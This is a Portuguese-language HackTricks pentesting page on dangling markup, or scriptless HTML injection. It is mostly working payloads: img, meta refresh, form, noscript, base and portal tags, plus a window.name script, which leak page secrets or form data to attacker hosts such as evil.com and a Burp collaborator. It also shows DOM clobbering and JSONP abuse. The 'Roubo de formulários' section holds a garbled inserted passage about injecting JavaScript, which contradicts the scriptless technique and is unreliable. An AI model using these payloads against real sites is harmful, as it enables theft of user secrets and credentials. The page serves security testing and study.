# Dangling Markup - Inje√ß√£o HTML sem script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Resumo

Essa t√©cnica pode ser usada para extrair informa√ß√µes de um usu√°rio quando uma **inje√ß√£o HTML √© encontrada**. Isso √© muito √∫til se voc√™ **n√£o encontrar nenhuma maneira de explorar um** [**XSS**](../xss-cross-site-scripting/), mas voc√™ pode **injetar algumas tags HTML**.\
Tamb√©m √© √∫til se algum **segredo estiver salvo em texto claro** no HTML e voc√™ quiser **extrair** isso do cliente, ou se voc√™ quiser enganar a execu√ß√£o de algum script.

V√°rias t√©cnicas comentadas aqui podem ser usadas para contornar algumas [**Pol√≠ticas de Seguran√ßa de Conte√∫do**](../content-security-policy-csp-bypass/) exfiltrando informa√ß√µes de maneiras inesperadas (tags html, CSS, http-meta tags, formul√°rios, base...).

## Principais Aplica√ß√µes

### Roubo de segredos em texto claro

Se voc√™ injetar `<img src='http://evil.com/log.cgi?` quando a p√°gina for carregada, a v√≠tima enviar√° para voc√™ todo o c√≥digo entre a tag `img` injetada e a pr√≥xima aspas dentro do c√≥digo. Se um segredo estiver de alguma forma localizado nesse trecho, voc√™ ir√° roub√°-lo (voc√™ pode fazer a mesma coisa usando aspas duplas, veja qual pode ser mais interessante de usar).

Se a tag `img` for proibida (devido a CSP, por exemplo), voc√™ tamb√©m pode usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Observe que o **Chrome bloqueia URLs HTTP** com "<" ou "\n" nele, ent√£o voc√™ pode tentar outros esquemas de protocolo como "ftp".

Voc√™ tamb√©m pode abusar do CSS `@import` (enviar√° todo o c√≥digo at√© encontrar um ";")
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Voc√™ tamb√©m pode usar **`<table`**:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Voc√™ tamb√©m pode inserir uma tag `<base`. Todas as informa√ß√µes ser√£o enviadas at√© que a cita√ß√£o seja fechada, mas isso requer alguma intera√ß√£o do usu√°rio (o usu√°rio deve clicar em algum link, porque a tag base ter√° alterado o dom√≠nio apontado pelo link):
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Roubo de formul√°rios

Nesta t√©cnica de inje√ß√£o de script sem marca√ß√£o, exploramos uma vulnerabilidade conhecida como "dangling markup" (marca√ß√£o pendente) para roubar informa√ß√µes de formul√°rios em um site.

#### Como funciona?

1. Identifique um site vulner√°vel que possua formul√°rios interativos.
2. Procure por p√°ginas que possuam c√≥digo HTML malformado ou incompleto.
3. Verifique se h√° tags de abertura de formul√°rio `<form>` sem a correspondente tag de fechamento `</form>`.
4. Insira um c√≥digo JavaScript malicioso dentro da tag `<form>`, aproveitando-se da vulnerabilidade de marca√ß√£o pendente.
5. O c√≥digo JavaScript injetado pode ser usado para capturar informa√ß√µes inseridas pelos usu√°rios nos campos do formul√°rio, como senhas, endere√ßos de e-mail, n√∫meros de telefone, etc.
6. As informa√ß√µes capturadas podem ser enviadas para um servidor controlado pelo atacante ou armazenadas em um arquivo para uso posterior.

#### Medidas de prote√ß√£o

Para proteger seu site contra esse tipo de ataque, siga estas pr√°ticas recomendadas:

- Certifique-se de que todas as tags HTML sejam fechadas corretamente.
- Valide e sanitize todos os dados de entrada recebidos dos usu√°rios.
- Implemente mecanismos de detec√ß√£o de c√≥digo malicioso e bloqueie qualquer tentativa de inje√ß√£o de script.
- Mantenha seu software e frameworks atualizados para corrigir quaisquer vulnerabilidades conhecidas.

Lembre-se de que a seguran√ßa do seu site √© uma responsabilidade cont√≠nua. Fique atento a poss√≠veis vulnerabilidades e aplique as medidas de prote√ß√£o adequadas.
```markup
<base href='http://evil.com/'>
```
Ent√£o, os formul√°rios que enviam dados para um caminho (como `<form action='update_profile.php'>`) enviar√£o os dados para o dom√≠nio malicioso.

### Roubo de formul√°rios 2

Defina um cabe√ßalho de formul√°rio: `<form action='http://evil.com/log_steal'>` isso ir√° sobrescrever o pr√≥ximo cabe√ßalho do formul√°rio e todos os dados do formul√°rio ser√£o enviados para o atacante.

### Roubo de formul√°rios 3

O bot√£o pode alterar a URL para onde as informa√ß√µes do formul√°rio ser√£o enviadas com o atributo "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Um atacante pode usar isso para roubar as informa√ß√µes.

### Roubo de segredos em texto claro 2

Usando a t√©cnica mencionada anteriormente para roubar formul√°rios (injetando um novo cabe√ßalho de formul√°rio), voc√™ pode ent√£o injetar um novo campo de entrada:
```markup
<input type='hidden' name='review_body' value="
```
e este campo de entrada conter√° todo o conte√∫do entre suas aspas duplas e as pr√≥ximas aspas duplas no HTML. Este ataque mistura "_**Roubo de segredos em texto claro**_" com "_**Roubo de formul√°rios2**_".

Voc√™ pode fazer a mesma coisa injetando um formul√°rio e uma tag `<option>`. Todos os dados at√© que um `</option>` fechado seja encontrado ser√£o enviados:
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Inje√ß√£o de par√¢metro de formul√°rio

Voc√™ pode alterar o caminho de um formul√°rio e inserir novos valores para que uma a√ß√£o inesperada seja executada:
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Roubo de segredos em texto claro via noscript

`<noscript></noscript>` √© uma tag cujo conte√∫do ser√° interpretado se o navegador n√£o suportar JavaScript (voc√™ pode habilitar/desabilitar o JavaScript no Chrome em [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Uma maneira de exfiltrar o conte√∫do da p√°gina da web a partir do ponto de inje√ß√£o at√© o final para um site controlado pelo atacante ser√° injetar o seguinte:
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassando CSP com intera√ß√£o do usu√°rio

A partir desta [pesquisa da PortSwigger](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), voc√™ pode aprender que mesmo em ambientes com as **restri√ß√µes mais r√≠gidas do CSP**, ainda √© poss√≠vel **extrair dados** com alguma **intera√ß√£o do usu√°rio**. Nesta ocasi√£o, vamos usar o payload:
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Observe que voc√™ solicitar√° √† **v√≠tima** que **clique em um link** que o redirecionar√° para um **payload** controlado por voc√™. Observe tamb√©m que o atributo **`target`** dentro da tag **`base`** conter√° **conte√∫do HTML** at√© a pr√≥xima aspa simples.\
Isso far√° com que o **valor** de **`window.name`** seja todo esse **conte√∫do HTML** quando o link for clicado. Portanto, como voc√™ **controla a p√°gina** em que a v√≠tima est√° acessando ao clicar no link, voc√™ pode acessar esse **`window.name`** e **extrair** esses dados:
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Fluxo de script enganoso 1 - Ataque de namespace HTML

Insira uma nova tag com um id dentro do HTML que ir√° sobrescrever a pr√≥xima e com um valor que afetar√° o fluxo de um script. Neste exemplo, voc√™ est√° selecionando com quem uma informa√ß√£o ser√° compartilhada:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Fluxo de script enganoso 2 - Ataque de namespace de script

Crie vari√°veis dentro do namespace do JavaScript inserindo tags HTML. Em seguida, essa vari√°vel afetar√° o fluxo da aplica√ß√£o:
```markup
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abuso de JSONP

Se voc√™ encontrar uma interface JSONP, poder√° chamar uma fun√ß√£o arbitr√°ria com dados arbitr√°rios:
```markup
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Ou voc√™ pode at√© tentar executar algum javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Uso indevido de Iframe

Observe que um **documento filho pode visualizar e definir a propriedade de localiza√ß√£o do pai, mesmo que seja de origem cruzada.** Isso significa que voc√™ pode fazer com que o cliente acesse qualquer outra p√°gina carregando dentro de um **iframe** algum c√≥digo como:
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Isso pode ser mitigado com algo como: _**sandbox='allow-scripts allow-top-navigation'**_

Um iframe tamb√©m pode ser explorado para vazar informa√ß√µes sens√≠veis de uma p√°gina diferente **usando o atributo de nome do iframe**. Isso ocorre porque voc√™ pode criar um iframe que se auto-iframe abusando da inje√ß√£o de HTML que faz com que as **informa√ß√µes sens√≠veis apare√ßam dentro do atributo de nome do iframe** e, em seguida, acessar esse nome do iframe inicial e vaz√°-lo.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Para mais informa√ß√µes, verifique [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuso

Voc√™ pode usar **`meta http-equiv`** para realizar **v√°rias a√ß√µes** como definir um Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou realizar um redirecionamento (em 5s neste caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Isso pode ser **evitado** com um **CSP** em rela√ß√£o ao **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nova tag HTML \<portal>

Voc√™ pode encontrar uma pesquisa muito **interessante** sobre vulnerabilidades explor√°veis da tag \<portal> [aqui](https://research.securitum.com/security-analysis-of-portal-element/).\
No momento em que este texto foi escrito, voc√™ precisa habilitar a tag portal no Chrome em `chrome://flags/#enable-portals` ou n√£o funcionar√°.
```markup
<portal src='https://attacker-server?
```
### Vazamentos de HTML

Nem todas as formas de vazamento de conectividade em HTML ser√£o √∫teis para o Dangling Markup, mas √†s vezes isso pode ajudar. Verifique-os aqui: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Vazamentos de SS

Isso √© uma **combina√ß√£o** entre **dangling markup e XS-Leaks**. De um lado, a vulnerabilidade permite **injetar HTML** (mas n√£o JS) em uma p√°gina da **mesma origem** daquela que estaremos atacando. Por outro lado, n√£o **atacaremos** diretamente a p√°gina onde podemos injetar HTML, mas **outra p√°gina**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search √© orientado para **extrair informa√ß√µes de origens cruzadas** abusando de **ataques de canal lateral**. Portanto, √© uma t√©cnica diferente do Dangling Markup, no entanto, algumas das t√©cnicas abusam da inclus√£o de tags HTML (com e sem execu√ß√£o de JS), como [**Inje√ß√£o de CSS**](../xs-search.md#css-injection) ou [**Carregamento Pregui√ßoso de Imagens**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Refer√™ncias

Todas as t√©cnicas apresentadas aqui e mais podem ser revisadas com mais detalhes em:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

Outras tags HTML que podem ser abusadas podem ser encontradas aqui:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

Mais informa√ß√µes:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
